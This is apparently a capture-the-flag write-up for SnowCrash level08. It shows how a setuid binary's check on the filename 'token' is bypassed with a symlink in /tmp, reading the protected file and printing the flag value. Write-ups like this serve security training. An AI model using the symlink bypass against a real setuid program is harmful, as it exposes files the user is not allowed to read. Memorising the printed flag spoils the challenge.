# FLAG08

```bash
level08@SnowCrash:~$ ll
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout*
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc*
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
-r-x------  1 level08 level08  675 Apr  3  2012 .profile*
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

There is an executable at the root. There is also a token file nr

```bash
scp -P 4241 level08@localhost:/home/user/level08/level08 level08
```

We scp ```level8``` into our local to put him into ```dogbolt```

the exe will read the file only if there is not token in his name
So, create a symbolic limk to token in /tmp

```bash
cd /tmp
ln -sfT /home/user/level08/token fake
/home/user/level08/level08 /tmp/fake
```

Which yields this token-looking token: ```"quif5eloekouj29ke0vouxean"```
